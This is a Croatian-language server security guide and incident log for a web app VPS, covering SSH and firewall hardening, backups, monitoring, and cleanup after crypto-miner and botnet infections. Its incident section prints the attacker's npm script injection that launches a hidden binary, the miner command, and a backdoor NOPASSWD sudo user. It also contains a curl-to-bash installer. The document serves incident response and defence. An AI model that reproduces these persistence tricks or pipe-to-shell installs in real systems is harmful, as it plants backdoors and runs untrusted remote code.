# Thesara Server - Sigurnosni Vodič i Best Practices

## 🛡️ IMPLEMENTIRANE SIGURNOSNE MJERE (2025-12-11)

### ✅ Trenutno aktivno:

1. **SSH Security**
   - ✅ SSH Key authentication obavezan
   - ✅ Password login onemogućen
   - ✅ PermitRootLogin set na "prohibit-password"

2. **Firewall (UFW)**
   - ✅ Aktivan i enabled on boot
   - ✅ Blokirani malicious IP-ovi: 67.217.57.240, 54.213.42.128, 213.35.108.69, 157.245.93.39
   - ✅ Blokirani Docker API portovi: 2375-2377, 4243-4244
   - ✅ Blokiran SOCKS5 port: 1080
   - ✅ Blokiran Ray cluster port: 8265
   - ✅ Dozvoljeni: **2222 (SSH - CUSTOM PORT)**, 80 (HTTP), 443 (HTTPS)
   - ❌ Port 22 ZATVOREN (stari SSH port - security hardening)

3. **Fail2ban**
   - ✅ Instaliran i aktivan
   - ✅ Štiti SSH od brute force napada
   - ✅ Default: 5 neuspješnih pokušaja = ban na 10min

4. **Malware Cleanup**
   - ✅ pcpcat crypto miner uklonjen
   - ✅ xmrig binary uklonjen
   - ✅ Malicious systemd servisi obrisani
   - ✅ Malicious cron jobovi uklonjeni (ako su postojali)

---

## 🔒 DODATNE PREPORUČENE MJERE

### 1. **Automatski Security Updates**

```bash
# Instaliraj unattended-upgrades
apt install unattended-upgrades -y

# Konfiguriraj
dpkg-reconfigure -plow unattended-upgrades

# Omogući auto-reboot ako je potrebno (opcionalno)
echo 'Unattended-Upgrade::Automatic-Reboot "true";' >> /etc/apt/apt.conf.d/50unattended-upgrades
echo 'Unattended-Upgrade::Automatic-Reboot-Time "03:00";' >> /etc/apt/apt.conf.d/50unattended-upgrades
```

### 2. **Postaviti Rate Limiting za Nginx**

Dodaj u `/etc/nginx/nginx.conf` u `http` blok:

```nginx
# Rate limiting zone
limit_req_zone $binary_remote_addr zone=general:10m rate=10r/s;
limit_req_zone $binary_remote_addr zone=api:10m rate=30r/s;

# Connection limiting
limit_conn_zone $binary_remote_addr zone=addr:10m;
```

Zatim u server blokovima:

```nginx
# Za API
location /api/ {
    limit_req zone=api burst=50 nodelay;
    limit_conn addr 10;
    # ... ostale direktive
}

# Za sve ostalo
location / {
    limit_req zone=general burst=20 nodelay;
    # ... ostale direktive
}
```

### 3. **Log Monitoring sa Logwatch**

```bash
# Instaliraj logwatch
apt install logwatch -y

# Konfiguriraj (opcionalno)
cp /usr/share/logwatch/default.conf/logwatch.conf /etc/logwatch/conf/

# Test - šalje dnevni email summary
logwatch --output mail --mailto your@email.com --detail high
```

### 4. **Rootkit Scanner (rkhunter)**

```bash
# Instaliraj
apt install rkhunter -y

# Inicijalni scan
rkhunter --update
rkhunter --propupd
rkhunter --check --skip-keypress

# Automatiziraj tjedno
echo "0 3 * * 0 /usr/bin/rkhunter --check --skip-keypress --report-warnings-only" | crontab -
```

### 5. **Disk Encryption (za buduće instalacije)**

Preporučeno za nove servere:
- LUKS full disk encryption
- Encrypted swap
- Encrypted `/srv/thesara/storage` folder

### 6. **Backup Strategy**

```bash
# Kreiraj backup script
cat > /root/backup-thesara.sh << 'EOF'
#!/bin/bash
BACKUP_DIR="/backups/thesara"
DATE=$(date +%Y%m%d)
mkdir -p $BACKUP_DIR

# Backup database
pg_dump thesara > $BACKUP_DIR/db-$DATE.sql

# Backup uploads
tar -czf $BACKUP_DIR/uploads-$DATE.tar.gz /srv/thesara/storage/uploads

# Backup .env files
tar -czf $BACKUP_DIR/env-$DATE.tar.gz /srv/thesara/app/apps/*/.env

# Cleanup old backups (keep last 7 days)
find $BACKUP_DIR -type f -mtime +7 -delete

echo "Backup complete: $DATE"
EOF

chmod +x /root/backup-thesara.sh

# Automatiziraj (dnevno u 2AM)
echo "0 2 * * * /root/backup-thesara.sh >> /var/log/thesara-backup.log 2>&1" | crontab -
```

### 7. **Monitoring sa Netdata (opcionalno)**

```bash
# Lightweight real-time monitoring
bash <(curl -Ss https://my-netdata.io/kickstart.sh)

# Dostupno na: http://your-server-ip:19999
# VAŽNO: Zaštiti sa nginx reverse proxy + basic auth!
```

### 8. **Automated Daily Security Reports (✅ IMPLEMENTIRANO)**

Server automatski šalje dnevne security reportove na `reports@thesara.space`.

#### **Email Setup:**

```bash
# Instaliran Postfix za slanje emailova
apt install mailutils postfix -y

# Konfiguracija:
# - System mail name: thesara.space
# - myhostname: thesara.space
# - mydestination: localhost, vps-thesaraspace-plusvps-com
```

#### **DNS Setup (SPF Record - OBAVEZNO):**

Dodaj TXT record u DNS:
```
Type: TXT
Name: thesara.space
Value: v=spf1 ip4:178.218.160.180 ~all
TTL: 14400
```

Opciono - DMARC record:
```
Type: TXT
Name: _dmarc
Value: v=DMARC1; p=none; rua=mailto:reports@thesara.space
TTL: 14400
```

#### **Security Report Script:**

```bash
# Lokacija: /root/daily-security-report.sh
# Provjerava:
# - Malware procese
# - Process count (PM2, API, Web)
# - Orphan procese (port 8789)
# - Service health (API/Web)
# - Firewall status
# - Fail2ban status
# - Docker containers
# - System stats (load, memory, failed logins)
```

#### **Cron Schedule:**

```bash
# Nedeljom 2 AM - Kill orphan process
0 2 * * 0 pkill -9 -f 'node.*8789' 2>/dev/null

# Svaki dan 4 AM - Security report
0 4 * * * /root/daily-security-report.sh

# Nedeljom 4:05 AM - PM2 graceful reload
5 4 * * 0 /usr/bin/pm2 reload all
```

#### **Troubleshooting Emailova:**

```bash
# Check da li su emailovi poslani
tail -20 /var/log/mail.log

# Provjeri mail queue
mailq

# Test email
echo "Test" | mail -s "Test Subject" reports@thesara.space

# Check Postfix status
systemctl status postfix

# Check SPF record (nakon DNS propagacije)
dig TXT thesara.space +short
```

---

## 📅 REDOVITI SIGURNOSNI TASKOVI

### **Tjedno:**
- [ ] Pokrenuti `./security-check.sh`
- [ ] Pregledati `/var/log/auth.log` za sumnjive SSH pokušaje
- [ ] Provjeriti PM2 logs: `pm2 logs --lines 100`
- [ ] Provjeriti fail2ban banned IP-ove: `fail2ban-client status sshd`

### **Mjesečno:**
- [ ] System update: `apt update && apt upgrade -y`
- [ ] Pregledati cron jobove: `crontab -l` i `/etc/cron.d/`
- [ ] Pregledati systemd servise: `systemctl list-unit-files --state=enabled`
- [ ] Rotirati JWT secrets (ako sumnjate na kompromis)

### **Kvartalno:**
- [ ] Full rootkit scan: `rkhunter --check`
- [ ] Review firewall rules: `ufw status numbered`
- [ ] Audit SSH keys: `cat /root/.ssh/authorized_keys`
- [ ] Database backup test (restore testni backup)

---

## 🚨 ŠTO RADITI AKO SUMNJATE NA HAKIRANJE

### **Simptomi:**
- Visoko CPU korištenje bez razloga
- Nepoznate konekcije u `ss -tulpn`
- Nepoznati procesi u `ps aux`
- Novi systemd servisi
- Novi cron jobovi

### **Hitne mjere:**

```bash
# 1. Disconnect from network (NAJSIGURNIJE)
ufw deny out from any

# 2. Pokreni security check
./security-check.sh > /root/security-incident-$(date +%Y%m%d).log

# 3. Check sve procese
ps aux --sort=-%cpu > /root/processes-$(date +%Y%m%d).log

# 4. Check network
ss -tulpn > /root/network-$(date +%Y%m%d).log

# 5. Promijeni SVE credentials
# - SSH keys
# - .env secrets
# - Database passwords

# 6. Fresh install (ako je ozbiljno kompromitiran)
```

---

## 🔐 CREDENTIALS MANAGEMENT

### **Gdje su pohranjene tajne:**

```
/srv/thesara/app/apps/api/.env       - API secrets
/srv/thesara/app/apps/web/.env.local - Web secrets (ako postoji)
/root/.ssh/authorized_keys           - SSH keys
```

### **Kako rotirati credentials:**

1. **JWT Secrets:**
   ```bash
   # Generiraj novi random string
   openssl rand -base64 32
   
   # Update u .env
   nano /srv/thesara/app/apps/api/.env
   # JWT_SECRET=NOVI_STRING
   
   # Restart API
   pm2 restart thesara-api
   ```

2. **Session Secret:**
   ```bash
   openssl rand -base64 64
   # Update SESSION_SECRET u .env
   ```

3. **Stripe Keys:**
   - Dashboard: https://dashboard.stripe.com/apikeys
   - Regenerate secret key
   - Update u `.env`

4. **Firebase:**
   - Console: https://console.firebase.google.com
   - Project Settings → Service Accounts → Generate new key
   - Update FIREBASE_* varijable

---

## 📊 MONITORING CHECKLIST

### **Brzi health check (svaki dan):**
```bash
# All-in-one quick check
pm2 status && \
systemctl status nginx --no-pager && \
systemctl status fail2ban --no-pager && \
ufw status | head -3
```

### **Detaljniji check (tjedno):**
```bash
./security-check.sh
```

---

## 🎯 RECAP - Što ste naučili danas:

1. ✅ Kako postaviti SSH key authentication
2. ✅ Kako onemogućiti password login
3. ✅ Kako konfigurirati UFW firewall
4. ✅ Kako instalirati i koristiti fail2ban
5. ✅ Kako detektirati i ukloniti malware
6. ✅ Kako deployati Next.js aplikaciju
7. ✅ Kako riješiti chunk loading errors

---

---

## 🚨 INCIDENT HISTORY

### **INCIDENT #1: 2025-12-11 - pcpcat/xmrig Crypto Miner**
- **Detected:** xmrig crypto miner running
- **Action:** Process killed, binaries removed
- **Persistence:** Systemd service removed
- **Status:** ✅ Resolved

### **INCIDENT #2: 2025-12-14 - Multi-Vector Malware Attack** 🔴

#### **Attack Vectors:**

1. **xmrig Crypto Miner**
   - Resource usage: 92.5% CPU
   - Process: `xmrig --url pool.hashvault.pro`
   - Location: `/var/tmp/xmrig-6.24.0/`

2. **javae Botnet**
   - Systemd service: `javae.service`
   - Persistence: Created systemd service in `/etc/systemd/system/`
   - Repeatedly killed by OOM killer
   - Total memory: ~2.4GB

3. **n0de Botnet**
   - Binary: `/var/tmp/.font/n0de`
   - Network: Connected to AWS (54.213.42.128) and external IPs
   - Companion files: `watcher.js`, `network.js`, `config.js`, `proc.js`, `utils.js`

4. **package.json Compromise** ⚠️ CRITICAL
   ```json
   "start": "nohup /var/tmp/.font/n0de > /dev/null 2>&1 & next start"
   "dev": "nohup /var/tmp/.font/n0de > /dev/null 2>&1 & next dev"
   ```
   - Malware injected directly into npm scripts
   - Triggered on every `npm start` execution

5. **Malware User Account**
   - Username: `bqodsmyf`
   - Privileges: `ALL=(ALL) NOPASSWD:ALL`
   - Created in sudoers.d

6. **Environment Hijacking**
   - File: `/etc/profile.d/env.sh`
   - Payload: `export HOME=/tmp`
   - Purpose: Redirect dotfiles to /tmp

#### **Remediation Actions Taken:**

✅ **Malware Removal:**
```bash
# Kill all malware processes
pkill -9 -f "xmrig|javae|n0de"

# Remove binaries and directories
rm -rf /var/tmp/xmrig-6.24.0
rm -rf /var/tmp/.font
rm -rf /var/tmp/.XIN-unix
rm -f /var/tmp/*.js

# Remove systemd service
systemctl stop javae.service
systemctl disable javae.service
rm -f /etc/systemd/system/javae.service
systemctl daemon-reload

# Clean package.json
sed -i 's|nohup /var/tmp/.font/n0de > /dev/null 2>&1 & ||g' /srv/thesara/app/apps/web/package.json

# Remove malware user
userdel -r bqodsmyf
grep -l "bqodsmyf" /etc/sudoers.d/* | xargs rm -f

# Remove profile hijack
rm -f /etc/profile.d/env.sh
```

✅ **SSH Hardening (NEW):**
```bash
# Changed SSH port from 22 to 2222
Port 2222
PasswordAuthentication no
PermitRootLogin prohibit-password

# Updated firewall
ufw allow 2222/tcp comment "SSH custom port"
ufw delete allow 22/tcp
ufw delete allow OpenSSH

# Disabled socket-based activation
systemctl disable ssh.socket
systemctl enable ssh.service
```

✅ **Firewall Enhancement:**
```bash
# Blocked malware C&C servers
ufw deny from 54.213.42.128 comment "Malware AWS"
ufw deny from 213.35.108.69 comment "Malware IP"
ufw deny from 157.245.93.39 comment "Malware IP"
```

✅ **Enhanced Monitoring:**
```bash
# Updated security-check.sh to detect:
# - n0de processes
# - Suspicious .js files in /tmp and /var/tmp
# - Cache files (excluded: node_modules, .cache)
```

#### **Root Cause Analysis:**

**Attack Vector:** Likely SSH brute force or compromised credentials on default port 22

**Persistence Mechanisms Found:**
1. ✅ Systemd services (`javae.service`)
2. ✅ npm package.json scripts injection
3. ✅ Profile.d script (`env.sh`)
4. ✅ Malware user with sudo access
5. ✅ Hidden directories in /var/tmp

**What Wasn't Compromised:**
- ✅ Git repository (clean)
- ✅ Local development machine (clean)
- ✅ GitHub account (no malicious commits)
- ✅ Application secrets (.env files - assumed safe)

#### **Prevention Measures Implemented:**

1. **SSH Hardening:**
   - Custom port (2222) instead of default 22
   - Password authentication disabled
   - Only SSH key authentication allowed

2. **Monitoring:**
   - Enhanced `security-check.sh` script
   - Daily security reports via email

3. **Network Security:**
   - Malware C&C servers blocked in firewall
   - Docker API ports remain blocked
   - Only essential ports open

#### **Lessons Learned:**

⚠️ **CRITICAL FINDING:** Malware modified `package.json` **directly on the server**
- Git history was clean
- Local code was clean
- Attack happened post-deployment

🔒 **New Security Policy:**
1. NEVER edit files directly on server
2. ALWAYS deploy from Git
3. Monitor package.json for unauthorized changes
4. Verify file integrity after deployment

---

**Zadnje updateano: 2025-12-14**
**Server: vps-thesaraspace.plusvps.com**
**Status: 🟢 SECURE & HARDENED**
**SSH Port: 2222** ⚠️ (Changed from 22)
**Email Monitoring: ✅ ACTIVE**
**Daily Reports: reports@thesara.space**
